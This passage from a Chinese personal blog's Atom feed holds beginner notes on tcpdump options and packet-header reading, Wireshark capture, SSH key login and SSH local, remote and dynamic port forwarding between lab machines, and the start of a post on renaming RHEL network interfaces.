    <content type="html"><![CDATA[<h3 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h3><blockquote><p>&#x4E00;&#x6B3E;sniffer&#x5DE5;&#x5177;&#xFF0C;&#x662F;Linux&#x4E0A;&#x7684;&#x6293;&#x5305;&#x5DE5;&#x5177;&#xFF0C;&#x55C5;&#x63A2;&#x5668;</p></blockquote><p><strong>&#x9009;&#x9879;</strong></p><pre><code>-a: &#x5C1D;&#x8BD5;&#x5C06;&#x7F51;&#x7EDC;&#x548C;&#x5E7F;&#x64AD;&#x5730;&#x5740;&#x8F6C;&#x6362;&#x6210;&#x540D;&#x79F0;&#xFF1B;-c&lt;&#x6570;&#x636E;&#x5305;&#x6570;&#x76EE;&gt;&#xFF1A;&#x6536;&#x5230;&#x6307;&#x5B9A;&#x7684;&#x6570;&#x636E;&#x5305;&#x6570;&#x76EE;&#x540E;&#xFF0C;&#x5C31;&#x505C;&#x6B62;&#x8FDB;&#x884C;&#x503E;&#x5012;&#x64CD;&#x4F5C;&#xFF1B;-d&#xFF1A;&#x628A;&#x7F16;&#x8BD1;&#x8FC7;&#x7684;&#x6570;&#x636E;&#x5305;&#x7F16;&#x7801;&#x8F6C;&#x6362;&#x6210;&#x53EF;&#x9605;&#x8BFB;&#x7684;&#x683C;&#x5F0F;&#xFF0C;&#x5E76;&#x503E;&#x5012;&#x5230;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#xFF1B;-dd&#xFF1A;&#x628A;&#x7F16;&#x8BD1;&#x8FC7;&#x7684;&#x6570;&#x636E;&#x5305;&#x7F16;&#x7801;&#x8F6C;&#x6362;&#x6210;C&#x8BED;&#x8A00;&#x683C;&#x5F0F;&#xFF0C;&#x5E76;&#x503E;&#x5012;&#x5230;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#xFF1B;-ddd&#xFF1A;&#x628A;&#x7F16;&#x8BD1;&#x8FC7;&#x7684;&#x6570;&#x636E;&#x5305;&#x7F16;&#x7801;&#x8F6C;&#x6362;&#x6210;&#x5341;&#x8FDB;&#x5236;&#x6570;&#x5B57;&#x7684;&#x683C;&#x5F0F;&#xFF0C;&#x5E76;&#x503E;&#x5012;&#x5230;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#xFF1B;-e&#xFF1A;&#x5728;&#x6BCF;&#x5217;&#x503E;&#x5012;&#x8D44;&#x6599;&#x4E0A;&#x663E;&#x793A;&#x8FDE;&#x63A5;&#x5C42;&#x7EA7;&#x7684;&#x6587;&#x4EF6;&#x5934;&#xFF1B;-f&#xFF1A;&#x7528;&#x6570;&#x5B57;&#x663E;&#x793A;&#x7F51;&#x9645;&#x7F51;&#x7EDC;&#x5730;&#x5740;&#xFF1B;-F&lt;&#x8868;&#x8FBE;&#x6587;&#x4EF6;&gt;&#xFF1A;&#x6307;&#x5B9A;&#x5185;&#x542B;&#x8868;&#x8FBE;&#x65B9;&#x5F0F;&#x7684;&#x6587;&#x4EF6;&#xFF1B;-i&lt;&#x7F51;&#x7EDC;&#x754C;&#x9762;&gt;&#xFF1A;&#x4F7F;&#x7528;&#x6307;&#x5B9A;&#x7684;&#x7F51;&#x7EDC;&#x622A;&#x9762;&#x9001;&#x51FA;&#x6570;&#x636E;&#x5305;&#xFF1B;-l&#xFF1A;&#x4F7F;&#x7528;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#x5217;&#x7684;&#x7F13;&#x51B2;&#x533A;&#xFF1B;-n&#xFF1A;&#x4E0D;&#x628A;&#x4E3B;&#x673A;&#x7684;&#x7F51;&#x7EDC;&#x5730;&#x5740;&#x8F6C;&#x6362;&#x6210;&#x540D;&#x5B57;&#xFF1B;-N&#xFF1A;&#x4E0D;&#x5217;&#x51FA;&#x57DF;&#x540D;&#xFF1B;-O&#xFF1A;&#x4E0D;&#x5C06;&#x6570;&#x636E;&#x5305;&#x7F16;&#x7801;&#x6700;&#x4F73;&#x5316;&#xFF1B;-p&#xFF1A;&#x4E0D;&#x8BA9;&#x7F51;&#x7EDC;&#x754C;&#x9762;&#x8FDB;&#x5165;&#x6DF7;&#x6742;&#x6A21;&#x5F0F;&#xFF1B;-q&#xFF1A;&#x5FEB;&#x901F;&#x8F93;&#x51FA;&#xFF0C;&#x4EC5;&#x5217;&#x51FA;&#x5C11;&#x6570;&#x7684;&#x4F20;&#x8F93;&#x534F;&#x8BAE;&#x4FE1;&#x606F;&#xFF1B;-r&lt;&#x6570;&#x636E;&#x5305;&#x6587;&#x4EF6;&gt;&#xFF1A;&#x4ECE;&#x6307;&#x5B9A;&#x7684;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;&#x6570;&#x636E;&#x5305;&#x6570;&#x636E;&#xFF1B;-s&lt;&#x6570;&#x636E;&#x5305;&#x5927;&#x5C0F;&gt;&#xFF1A;&#x8BBE;&#x7F6E;&#x6BCF;&#x4E2A;&#x6570;&#x636E;&#x5305;&#x7684;&#x5927;&#x5C0F;&#xFF1B;-S&#xFF1A;&#x7528;&#x7EDD;&#x5BF9;&#x800C;&#x975E;&#x76F8;&#x5BF9;&#x6570;&#x503C;&#x5217;&#x51FA;TCP&#x5173;&#x8054;&#x6570;&#xFF1B;-t&#xFF1A;&#x5728;&#x6BCF;&#x5217;&#x503E;&#x5012;&#x8D44;&#x6599;&#x4E0A;&#x663E;&#x793A;&#x65F6;&#x95F4;&#x6233;&#x8BB0;&#xFF1B;-tt&#xFF1A;&#x5728;&#x6BCF;&#x5217;&#x503E;&#x5012;&#x8D44;&#x6599;&#x4E0A;&#x663E;&#x793A;&#x672A;&#x7ECF;&#x683C;&#x5F0F;&#x5316;&#x7684;&#x65F6;&#x95F4;&#x6233;&#x8BB0;&#xFF1B;-T&lt;&#x6570;&#x636E;&#x5305;&#x7C7B;&#x578B;&gt;&#xFF1A;&#x5F3A;&#x5236;&#x5C06;&#x8868;&#x8FBE;&#x65B9;&#x5F0F;&#x6240;&#x6307;&#x5B9A;&#x7684;&#x6570;&#x636E;&#x5305;&#x8F6C;&#x8BD1;&#x6210;&#x8BBE;&#x7F6E;&#x7684;&#x6570;&#x636E;&#x5305;&#x7C7B;&#x578B;-v&#xFF1A;&#x8BE6;&#x7EC6;&#x663E;&#x793A;&#x6307;&#x4EE4;&#x6267;&#x884C;&#x8FC7;&#x7A0B;-vv&#xFF1A;&#x66F4;&#x8BE6;&#x7EC6;&#x663E;&#x793A;&#x6307;&#x4EE4;&#x6267;&#x884C;&#x8FC7;&#x7A0B;-x&#xFF1A;&#x7528;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x7801;&#x5217;&#x51FA;&#x6570;&#x636E;&#x5305;&#x8D44;&#x6599;&#xFF1B;-w&lt;&#x6570;&#x636E;&#x5305;&#x6587;&#x4EF6;&gt;&#xFF1A;&#x628A;&#x6570;&#x636E;&#x5305;&#x6570;&#x636E;&#x5199;&#x5165;&#x6307;&#x5B9A;&#x7684;&#x6587;&#x4EF6;&#x3002;</code></pre><hr><blockquote><p><code>[S]</code>: SYN(&#x5F00;&#x59CB;&#x8FDE;&#x63A5;)<br><code>[.]</code>:&#x6CA1;&#x6709;Flag&#xFF0C;&#xFF08;&#x7531;&#x4E8E;&#x9664;&#x4E86;SYN&#x5305;&#x5916;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x5305;&#x90FD;&#x6709;ACK&#xFF0C;&#x6240;&#x4EE5;&#x4E00;&#x822C;&#x8FD9;&#x4E2A;&#x6807;&#x5FD7;&#x4E5F;&#x53EF;&#x8868;&#x793A;ACK&#xFF09;<br><code>[P]</code>: PSH(&#x63A8;&#x9001;&#x6570;&#x636E;<br><code>[F]</code>: FIN(&#x7ED3;&#x675F;&#x8FDE;&#x63A5;<br><code>[R]</code>: RST(&#x91CD;&#x7F6E;&#x8FDE;&#x63A5;<br><code>[S.]</code>: &#x8868;&#x793A;SYN-ACK&#xFF0C;&#x5C31;&#x662F;SYN&#x62A5;&#x6587;&#x7684;&#x5E94;&#x7B54;&#x62A5;&#x6587;</p></blockquote><pre><code>21:27:06.995846 IP (tos 0x0, ttl 64, id 45646, offset 0, flags [DF], proto TCP (6), length 64)    192.168.1.110.40411 &gt; 192.168.1.123.80: Flags [S], cksum 0xa730 (correct), seq 992042666, win 65535, options [mss 1460,nop,wscale 4,nop,nop,TS val 663433143 ecr 0,sackOK,eol], length 021:27:07.030487 IP (tos 0x0, ttl 51, id 0, offset 0, flags [DF], proto TCP (6), length 44)    192.168.1.123.80 &gt; 192.168.1.110.40411: Flags [S.], cksum 0xedc0 (correct), seq 2147006684, ack 992042667, win 14600, options [mss 1440], length 021:27:07.030527 IP (tos 0x0, ttl 64, id 59119, offset 0, flags [DF], proto TCP (6), length 40)    192.168.1.110.40411 &gt; 192.168.1.123.80: Flags [.], cksum 0x3e72 (correct), ack 2147006685, win 65535, length 0</code></pre><p><strong>&#x683C;&#x5F0F;&#x89E3;&#x8BFB;</strong></p><ul><li><p>192.168.1.110.40411</p><ul><li>&#x6E90;&#x5730;&#x5740;IP.&#x6E90;&#x7AEF;&#x53E3;</li></ul></li><li><p>192.168.1.123.80</p><ul><li>&#x76EE;&#x7684;&#x5730;&#x5740;.&#x76EE;&#x7684;&#x7AEF;&#x53E3;</li></ul></li><li><p><code>&gt;</code></p><ul><li>&#x4EE3;&#x8868;&#x6570;&#x636E;&#x7684;&#x65B9;&#x5411;</li></ul></li></ul><h4 id="&#x6570;&#x636E;&#x5305;&#x5206;&#x6790;"><a href="#&#x6570;&#x636E;&#x5305;&#x5206;&#x6790;" class="headerlink" title="&#x6570;&#x636E;&#x5305;&#x5206;&#x6790;"></a>&#x6570;&#x636E;&#x5305;&#x5206;&#x6790;</h4><pre><code class="bash">tcpdump -ntx -c 1# -n &#x663E;&#x793A;IP&#x5730;&#x5740;&#x800C;&#x975E;&#x57DF;&#x540D;&#x5730;&#x5740;# -t &#x4E0D;&#x663E;&#x793A;&#x65F6;&#x95F4;&#x6233;# -x &#x4EE5;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x663E;&#x793A;&#x5305;&#x5185;&#x5BB9;# -c tcpdump&#x5C06;&#x5728;&#x63A5;&#x53D7;1&#x4E2A;&#x6570;&#x636E;&#x5305;&#x540E;&#x9000;&#x51FA;</code></pre><p>.png</p><p>192.168.73.10.ssh &gt; 192.168.73.1.13229&#x8868;&#x793A;&#xFF1A;<br>&#x6E90;ip 192.168.73.10&#xFF0C;&#x670D;&#x52A1;/&#x7AEF;&#x53E3;ssh;<br>&#x76EE;&#x7684;ip 192.168.73.1&#xFF0C;&#x670D;&#x52A1;/&#x7AEF;&#x53E3;13229</p><p><strong>&#x770B;&#x5230;0x000&#x884C;</strong></p><ul><li>&#x534F;&#x8BAE;&#x7248;&#x672C;&#xFF1A;&#x7B2C;&#x4E00;&#x4E2A;&#x6570;&#x5B57;&#x4E3A;4&#xFF0C;&#x8868;&#x793A;0x4&#x3002;&#x5373;&#x534F;&#x8BAE;&#x7248;&#x672C;&#x662F;IPv4<br>  &#x5E38;&#x89C1;&#x7684;&#x4E00;&#x4E9B;&#x534F;&#x8BAE;&#x76F8;&#x5E94;&#x5B57;&#x6BB5;&#x503C;</li></ul><table><thead><tr><th>&#x534F;&#x8BAE;&#x540D;</th><th>ICMP</th><th>IGMP</th><th>IP</th><th>TCP</th><th>EGP</th><th>IGP</th><th>UDP</th><th>IPv6</th><th>ESP</th><th>OSPF</th></tr></thead><tbody><tr><td>&#x534F;&#x8BAE;&#x5B57;&#x6BB5;&#x503C;</td><td>1</td><td>2</td><td>4</td><td>6</td><td>8</td><td>9</td><td>17</td><td>41</td><td>50</td><td>89</td></tr></tbody></table><ul><li><p>&#x9996;&#x90E8;&#x957F;&#x5EA6;&#xFF1A;&#x7B2C;&#x4E8C;&#x4E2A;&#x6570;&#x5B57;&#x4E3A;5&#xFF0C;&#x8868;&#x793A;0x5&#x3002;5*4=20&#xFF08;&#x5341;&#x516D;&#x8FDB;&#x5236;1&#x4F4D;&#x5BF9;&#x5E94;&#x4E8C;&#x8FDB;&#x5236;4&#x4F4D;&#xFF09;&#xFF0C;&#x8868;&#x793A;IP&#x62A5;&#x5934;&#x957F;&#x5EA6;&#x4E3A;20&#x5B57;&#x8282;&#x3002;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#x901A;&#x5E38;&#x7B49;&#x4E8E;8&#x4F4D;&#xFF0C;&#x6240;&#x4EE5;IP&#x62A5;&#x5934;&#x4E3A;4510&#x5230;4901<br>.png</p></li><li><p>&#x670D;&#x52A1;&#x7C7B;&#x578B;TOS&#xFF1A;0x00&#xFF0C;&#x610F;&#x5473;&#x7740;&#x662F;&#x4E00;&#x822C;&#x670D;&#x52A1;</p></li><li>&#x603B;&#x957F;&#x5EA6;&#xFF1A;0x00ec&#xFF0C;&#x6362;&#x7B97;&#x6210;&#x5341;&#x8FDB;&#x5236;&#x4E3A;236&#x5B57;&#x8282;&#x3002;</li><li>&#x6807;&#x8BC6;&#xFF1A;0x5175</li><li>3bit&#x6807;&#x5FD7;+13bit&#x7247;&#x504F;&#x79FB;&#xFF1A;0x4000</li><li>&#x751F;&#x5B58;&#x65F6;&#x95F4;&#xFF1A;0x40&#xFF0C;&#x5341;&#x8FDB;&#x5236;&#x503C;&#x4E3A;64</li><li>&#x534F;&#x8BAE;&#xFF1A;0x06 &#x4EE3;&#x8868;TCP&#x534F;&#x8BAE;<br>&#x9996;&#x90E8;&#x6821;&#x9A8C;&#x548C;&#xFF1A;0xd52a</li></ul><h3 id="Wireshark&#x7684;&#x4F7F;&#x7528;"><a href="#Wireshark&#x7684;&#x4F7F;&#x7528;" class="headerlink" title="Wireshark&#x7684;&#x4F7F;&#x7528;"></a>Wireshark&#x7684;&#x4F7F;&#x7528;</h3><p><strong>&#x901A;&#x8FC7;tcpdump&#x6293;&#x5305;&#x5BFC;&#x51FA;pcap&#x6587;&#x4EF6;</strong></p><pre><code class="bash">tcpdump -i ens33 icmp and host 192.167.73.100 -w ping.pcap</code></pre><p><strong>&#x4F7F;&#x7528;wireshark&#x6253;&#x5F00;&#x8F93;&#x51FA;&#x7684;&#x6587;&#x4EF6;</strong><br>.png</p><p>&#x53C2;&#x8003;&#xFF1A;<a href="https://www.cnblogs.com/xiaolincoding/p/12922927.html" target="_blank" rel="noopener">&#x5B9E;&#x6218;&#xFF01;&#x6211;&#x7528; Wireshark &#x8BA9;&#x4F60;&#x201C;&#x770B;&#x89C1;&#x201C; TCP</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;tcpdump&quot;&gt;&lt;a href=&quot;#tcpdump&quot; class=&quot;headerlink&quot; title=&quot;tcpdump&quot;&gt;&lt;/a&gt;tcpdump&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;&amp;#x4E00;&amp;#x6B3E;sniffer&amp;#x5DE5;&amp;#x517
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SSH原理与应用</title>
    <link href="https://marnm.github.io//posts/e228b71f/"/>
    <id>https://marnm.github.io//posts/e228b71f/</id>
    <published>2022-06-07T04:41:45.000Z</published>
    <updated>2022-06-07T05:18:57.890Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSH&#x539F;&#x7406;"><a href="#SSH&#x539F;&#x7406;" class="headerlink" title="SSH&#x539F;&#x7406;"></a>SSH&#x539F;&#x7406;</h2><h2 id="SSH&#x5B89;&#x88C5;&#x4E0E;&#x914D;&#x7F6E;"><a href="#SSH&#x5B89;&#x88C5;&#x4E0E;&#x914D;&#x7F6E;" class="headerlink" title="SSH&#x5B89;&#x88C5;&#x4E0E;&#x914D;&#x7F6E;"></a>SSH&#x5B89;&#x88C5;&#x4E0E;&#x914D;&#x7F6E;</h2><h2 id="SSH&#x57FA;&#x672C;&#x7528;&#x6CD5;"><a href="#SSH&#x57FA;&#x672C;&#x7528;&#x6CD5;" class="headerlink" title="SSH&#x57FA;&#x672C;&#x7528;&#x6CD5;"></a>SSH&#x57FA;&#x672C;&#x7528;&#x6CD5;</h2><h2 id="SSH&#x53E3;&#x4EE4;&#x767B;&#x5F55;&#x4E0E;&#x516C;&#x94A5;&#x767B;&#x5F55;"><a href="#SSH&#x53E3;&#x4EE4;&#x767B;&#x5F55;&#x4E0E;&#x516C;&#x94A5;&#x767B;&#x5F55;" class="headerlink" title="SSH&#x53E3;&#x4EE4;&#x767B;&#x5F55;&#x4E0E;&#x516C;&#x94A5;&#x767B;&#x5F55;"></a>SSH&#x53E3;&#x4EE4;&#x767B;&#x5F55;&#x4E0E;&#x516C;&#x94A5;&#x767B;&#x5F55;</h2><h3 id="&#x53E3;&#x4EE4;&#x767B;&#x5F55;"><a href="#&#x53E3;&#x4EE4;&#x767B;&#x5F55;" class="headerlink" title="&#x53E3;&#x4EE4;&#x767B;&#x5F55;"></a>&#x53E3;&#x4EE4;&#x767B;&#x5F55;</h3><h3 id="&#x516C;&#x94A5;&#x8BA4;&#x8BC1;&#x767B;&#x5F55;"><a href="#&#x516C;&#x94A5;&#x8BA4;&#x8BC1;&#x767B;&#x5F55;" class="headerlink" title="&#x516C;&#x94A5;&#x8BA4;&#x8BC1;&#x767B;&#x5F55;"></a>&#x516C;&#x94A5;&#x8BA4;&#x8BC1;&#x767B;&#x5F55;</h3><pre><code class="shell">ssh-keygen -t rsa -C &quot;your_mail@example.com&quot; -f github_rsa</code></pre><h4 id="Windows&#x4E0E;Linux&#x4E4B;&#x95F4;&#x5B9E;&#x73B0;&#x514D;&#x5BC6;&#x767B;&#x5F55;"><a href="#Windows&#x4E0E;Linux&#x4E4B;&#x95F4;&#x5B9E;&#x73B0;&#x514D;&#x5BC6;&#x767B;&#x5F55;" class="headerlink" title="Windows&#x4E0E;Linux&#x4E4B;&#x95F4;&#x5B9E;&#x73B0;&#x514D;&#x5BC6;&#x767B;&#x5F55;"></a>Windows&#x4E0E;Linux&#x4E4B;&#x95F4;&#x5B9E;&#x73B0;&#x514D;&#x5BC6;&#x767B;&#x5F55;</h4><pre><code># Windows&#x5BA2;&#x6237;&#x7AEF;&#xFF1A;ssh-keygen...id_rsa_ubuntu......scp keygen_file.pub linux@addree:~/.ssh/# Linux&#x670D;&#x52A1;&#x5668;:cat .ssh/id_rsa_ubuntu.pub &gt; authorized_keys# Windows&#x5BA2;&#x6237;&#x7AEF;:notepad C:\Users\Administrator\.ssh\configHost 192.168.73.30HostName 192.168.73.30User echoPreferredAuthentications publickeyIdentityFile ~/.ssh/id_rsa_ubuntu</code></pre><h2 id="SSH&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;"><a href="#SSH&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;" class="headerlink" title="SSH&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;"></a>SSH&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;</h2><h3 id="&#x672C;&#x5730;&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;"><a href="#&#x672C;&#x5730;&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;" class="headerlink" title="&#x672C;&#x5730;&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;"></a>&#x672C;&#x5730;&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;</h3><p><strong>&#x4EE5;MySQL&#x4E3A;&#x4F8B;</strong></p><blockquote><p>MySQL&#x670D;&#x52A1;&#x5668;&#x4E0D;&#x5141;&#x8BB8;MySQL&#x8FDC;&#x7A0B;&#x8BBF;&#x95EE;<br>&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x5EFA;&#x7ACB;&#x4E0E;MySQL&#x670D;&#x52A1;&#x5668;&#x7684;ssh&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x8FDE;&#x63A5;</p></blockquote><p><strong>&#x4E09;&#x79CD;&#x683C;&#x5F0F;&#xFF08;&#x4EFB;&#x610F;&#x4E00;&#x79CD;&#x5199;&#x6CD5;&#x90FD;&#x884C;&#xFF09;&#xFF1A;</strong></p><pre><code>ssh -L 127.0.0.1:3306:127.0.0.1:3306 echo@192.168.73.30</code></pre><p>&#x672C;&#x5730;&#x7F51;&#x5361;&#x5730;&#x5740;&#x53EF;&#x4EE5;&#x7701;&#x7565;&#xFF1A;</p><pre><code>ssh -L 3306:127.0.0.1:3306 root@192.168.73.30</code></pre><p>&#x82E5;&#x4E24;&#x53F0;&#x673A;&#x5668;&#x7684;&#x767B;&#x5F55;&#x7528;&#x6237;&#x540D;&#x76F8;&#x540C;&#xFF0C;&#x53EF;&#x4EE5;&#x7701;&#x7565;&#x767B;&#x5F55;&#x7528;&#x6237;&#x540D;&#xFF1A;</p><pre><code>ssh -L 3306:127.0.0.1:3306 192.168.73.30</code></pre><p>&#x8FDC;&#x7A0B;&#x547D;&#x4EE4;</p><pre><code>ssh user@ip &apos;command&apos;ssh root@192.168.10.12 &apos;uname -a&apos;tar -cz test | ssh root@192.168.10.12 &apos;tar -xz&apos;</code></pre><p><em>&#x3010;&#x6CE8;&#x610F;&#xFF01;&#x3011;&#x5BA2;&#x6237;&#x7AEF;&#x7528;&#x4E8E;&#x5EFA;&#x7ACB;&#x6620;&#x5C04;&#x7684;&#x7AEF;&#x53E3;&#x4E0D;&#x80FD;&#x88AB;&#x5360;&#x7528;</em></p><p><strong>&#x3010;&#x6D4B;&#x8BD5;&#x3011;</strong></p><blockquote><p>&#x5728;MySQL&#x670D;&#x52A1;&#x5668;&#x67E5;&#x770B;&#x6570;&#x636E;&#x5E93;&#x5982;&#x4E0B;&#xFF1A;</p></blockquote><p>.png</p><blockquote><p>&#x5728;&#x53E6;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x4E0A;&#x53EF;&#x4EE5;&#x767B;&#x5F55;&#x5230;MySQL&#x670D;&#x52A1;&#x5668;&#xFF1A;</p></blockquote><p>.png</p><blockquote><p>&#x5173;&#x95ED;&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x8FDE;&#x63A5;&#xFF0C;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#x65E0;&#x6CD5;&#x767B;&#x5F55;&#xFF1A;</p></blockquote><p>.png</p><p><strong>&#x6CE8;&#x610F;&#xFF1A;</strong> &#x5982;&#x679C;&#x4F60;&#x4E00;&#x76F4;&#x8BBF;&#x95EE;&#x7740;&#x8FDC;&#x7A0B;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x90A3;&#x4E48;ssh&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x8FDE;&#x63A5;&#x65E0;&#x6CD5;&#x5173;&#x95ED;</p><hr><p><strong>Apache/Nginx&#x7684;&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#xFF1A;</strong></p><pre><code>ssh -L 192.168.73.10:80:127.0.0.1:80 echo@192.168.73.30</code></pre><blockquote><p>&#x628A;&#x672C;&#x5730;&#x7684;&#x67D0;&#x4E2A;&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x5230;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF1A;</p></blockquote><p><strong>Nginx&#x670D;&#x52A1;&#x5668;</strong><br>.png</p><p><strong>&#x5BA2;&#x6237;&#x7AEF;</strong><br>.png</p><p>ssh -f -N -L 192.168.73.10:80:192.168.73.30:80 <a href="mailto:echo@192.168.73.30" target="_blank" rel="noopener">echo@192.168.73.30</a></p><p>.png<br>.png</p><h3 id="&#x8FDC;&#x7A0B;&#x8F6C;&#x53D1;"><a href="#&#x8FDC;&#x7A0B;&#x8F6C;&#x53D1;" class="headerlink" title="&#x8FDC;&#x7A0B;&#x8F6C;&#x53D1;"></a>&#x8FDC;&#x7A0B;&#x8F6C;&#x53D1;</h3><blockquote><p>&#x8FDC;&#x7A0B;&#x8F6C;&#x53D1;&#x662F;&#x901A;&#x8FC7;&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x95F4;&#x5185;&#x7F51;&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x5230;&#x516C;&#x7F51;&#x7AEF;&#x53E3;&#x4E0A;<br>&#x4F7F;&#x7528;&#x8FDC;&#x7A0B;&#x8F6C;&#x53D1;&#x9700;&#x8981;&#x5148;&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;<br>&#x5141;&#x8BB8;&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x548C;&#x5141;&#x8BB8;&#x7AEF;&#x53E3;&#x7ED1;&#x5B9A;</p></blockquote><pre><code>vim /etc/ssh/sshd_configAllowTcpForwarding yesGatewayPorts yes</code></pre><h4 id="&#x4F8B;&#x5B50;&#xFF1A;"><a href="#&#x4F8B;&#x5B50;&#xFF1A;" class="headerlink" title="&#x4F8B;&#x5B50;&#xFF1A;"></a><strong>&#x4F8B;&#x5B50;&#xFF1A;</strong></h4><p>CentOS 7&#xFF1A;192.168.110.20<br>RHEL 7: 192.168.73.10<br>Ubuntu 18.04(Nginx Server): 192.168.73.30</p><hr><p>Ubuntu:<br>&#x5C06;&#x672C;&#x5730;80&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x5230;rhel 7&#x4E0A;</p><pre><code>ssh -R 0.0.0.0:80:localhost:80 root@192.168.73.10</code></pre><p>rhel 7:<br>&#x5C06;&#x672C;&#x5730;&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x5230;CentOS 7&#x4E0A;</p><pre><code>ssh -R 0.0.0.0:80:localhost:80 root@192.168.110.20</code></pre><h3 id="&#x52A8;&#x6001;&#x8F6C;&#x53D1;"><a href="#&#x52A8;&#x6001;&#x8F6C;&#x53D1;" class="headerlink" title="&#x52A8;&#x6001;&#x8F6C;&#x53D1;"></a>&#x52A8;&#x6001;&#x8F6C;&#x53D1;</h3><p>ssh -D [&#x672C;&#x5730;&#x5730;&#x5740;]:&#x672C;&#x5730;&#x7AEF;&#x53E3;&#x53F7; &#x8FDC;&#x7A0B;&#x7528;&#x6237;@&#x8FDC;&#x7A0B;&#x5730;&#x5740;</p><p><strong>&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x7EF4;&#x6301;</strong><br>&#x52A8;&#x6001;&#x8F6C;&#x53D1; ssh -D 1080 user@server1_ip<br>&#x7EF4;&#x6301;&#x94FE;&#x63A5; ssh -o ServerAliveInterval=time user@ip</p><p><strong>&#x6587;&#x6863;</strong><a href="https://www.ssh.com/academy/ssh/tunneling/example" target="_blank" rel="noopener">https://www.ssh.com/academy/ssh/tunneling/example</a></p><h2 id="&#x4E2D;&#x95F4;&#x4EBA;&#x653B;&#x51FB;"><a href="#&#x4E2D;&#x95F4;&#x4EBA;&#x653B;&#x51FB;" class="headerlink" title="&#x4E2D;&#x95F4;&#x4EBA;&#x653B;&#x51FB;"></a>&#x4E2D;&#x95F4;&#x4EBA;&#x653B;&#x51FB;</h2><h2 id="&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x53C2;&#x6570;&#x89E3;&#x91CA;"><a href="#&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x53C2;&#x6570;&#x89E3;&#x91CA;" class="headerlink" title="&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x53C2;&#x6570;&#x89E3;&#x91CA;"></a>&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x53C2;&#x6570;&#x89E3;&#x91CA;</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SSH&amp;#x539F;&amp;#x7406;&quot;&gt;&lt;a href=&quot;#SSH&amp;#x539F;&amp;#x7406;&quot; class=&quot;headerlink&quot; title=&quot;SSH&amp;#x539F;&amp;#x7406;&quot;&gt;&lt;/a&gt;SSH&amp;#x539F;&amp;#x7406;&lt;/h2&gt;&lt;h2 i
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>rhel修改网卡命名规则</title>
    <link href="https://marnm.github.io//posts/bae5d4f0/"/>
    <id>https://marnm.github.io//posts/bae5d4f0/</id>
    <published>2022-06-07T04:41:31.000Z</published>
    <updated>2022-06-07T05:19:24.674Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x4FEE;&#x6539;&#x7F51;&#x5361;&#x540D;&#x79F0;"><a href="#&#x4FEE;&#x6539;&#x7F51;&#x5361;&#x540D;&#x79F0;" class="headerlink" title="&#x4FEE;&#x6539;&#x7F51;&#x5361;&#x540D;&#x79F0;"></a>&#x4FEE;&#x6539;&#x7F51;&#x5361;&#x540D;&#x79F0;</h2><pre><code class="shell">mv /etc/sysconfig/network-scripts/ifcfg-ens33 /etc/sysconfig/network-scripts/ifcfg-eth0vim /etc/sysconfig/network-scripts/ifcfg-eth0</code></pre><pre><code class="ini">TYPE=Ethernet....NAME=eth0DEVICE=eth0...</code></pre><h2 id="&#x7981;&#x7528;&#x7F51;&#x5361;&#x547D;&#x540D;&#x89C4;&#x5219;"><a href="#&#x7981;&#x7528;&#x7F51;&#x5361;&#x547D;&#x540D;&#x89C4;&#x5219;" class="headerlink" 